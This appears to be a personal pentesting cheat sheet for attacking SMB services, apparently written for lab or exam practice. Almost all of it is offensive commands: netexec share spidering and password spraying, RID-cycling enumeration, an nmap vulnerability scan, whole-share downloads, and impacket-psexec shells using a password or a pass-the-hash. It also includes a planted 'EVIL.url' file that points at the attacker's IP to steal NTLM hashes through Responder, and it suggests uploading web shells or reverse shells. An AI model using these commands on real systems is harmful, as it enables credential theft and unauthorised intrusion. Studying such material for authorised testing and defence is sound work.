```bash
# dump all readable files
nxc smb <ip> -u '<user>' -p '<pass>' -M spider_plus -o DOWNLOAD_FLAG=TRUE
```
## Password Spraying
use [[Netexec]] to determine if any creds you have are valid

## Automated Enumeration
enum4linux-ng
	if results come back, look THOUROUGHLY (cleartext passwords possible)
```bash
# anonymous auth
enum4linux-ng -AC <ip>

# authenticated auth
enum4linux-ng -AC -u <user> -p <pass> -w <domain> <ip>

## ALTERNATIVE
enum4linux <ip>
```

nbtscan
```bash
sudo nbtscan -r 192.168.50.0/24 #IP or range can be provided
```

Vuln Scan:
```bash
nmap -script=smb-vuln\* -p445 <ip>
```

## RID Cycling Attack
RID Cycling (User Enumeration)
```bash
# nxc method
nxc smb <ip> -d <domain> -u 'guest' -p '' --rid-brute

# impacket-lookupsid method
impacket-lookupsid <domain>/guest@<ip> -n
```
## Manual Enumeration
DO NOT IGNORE ANY FOLDERS, INCLUDING NETLOGON AND SYSVOL!!! DOWNLOAD THE WHOLE SHARE AND TREE -A
#### Linux
Anonymous Auth
```bash
# Note, linux boxes you may use forward slash //
# List Shares
smbclient -N -L \\\\<ip_address>

# Connect to Share
smbclient -N \\\\<ip_address>\\<share>
```

Authenticated Auth
```bash
# lists shares
smbclient -L \\\\<ip_address> --user <user> --workgroup <domain>

# Connect to share
smbclient \\\\<ip_address>\\<share> --user <user> --workgroup <domain>`
```

Download whole shares
```bash
# If theres a lot to parse, it might be useful to grab it all and 'tree' it

mask ""
recurse ON
prompt OFF
mget *
```

#### Windows
There may be some scenarios where we cannot use smbclient to authenticate (see errors section) and are forced to use windows commands from windows host

```sh
# First identify share you want to access from victim host

# map share to drive
net use H: \\<ip>\<share> /user:<domain>\<user> <PASSWD> /y

# verify share was mapped
net view \\<ip>

# Switch drive
H:
```

## PUT File Abuse
can you put files to the SMB server?
	yes?
		try responder to catch a user hash:
```bash
1. Create file 'EVIL.url' with this malicious code:

[InternetShortcut]  
URL=Random_nonsense  
WorkingDirectory=Flibertygibbit  
IconFile=\\<YOUR tun0 IP>\%USERNAME%.icon  
IconIndex=1

2. Start responder

sudo responder -I tun0 -wv


3. Upload EVIL.url to SMB share

4. Check Responder for user hash

```
Learn more about similar attacks [here ](https://github.com/Greenwolf/ntlm_theft?source=post_page-----158516460860---------------------------------------)

Also consider uploading reverse shells / web shells if the target hosts an http server

## File Transfer
Might be able leverage SMB to upload a webshell, then get a reverse shell...

Also, adjusting `timeout` value can be useful for large file transfer such as SYSTEM, ntds.dit, etc...
	`timeout <time_in_seconds>`
	default is 0
	so
		`timeout 1000` should be sufficient for anything


## Remote Command Execution
If we have credentials with Administrative privileges, we can use `impacket-psexec` to gain a shell via SMB

impacket-psexec Usage
```bash
# hash
impacket-psexec -hashes <LMHASH:NTHASH> administrator@<victim_ip> <command(cmd.exe)>

# password
impacket-psexec 'domain'/'user':'password'@<target_ip> <command(cmd.exe)>
```

## Errors

NT_STATUS_INVALID_WORKSTATION
	This means the workstation will only accept connections from certain boxes 
		ie: internal hosts only most likely...
	How to fix?
		Browse the share from an internal host
		see manual enumeration -- may have to use windows techniques


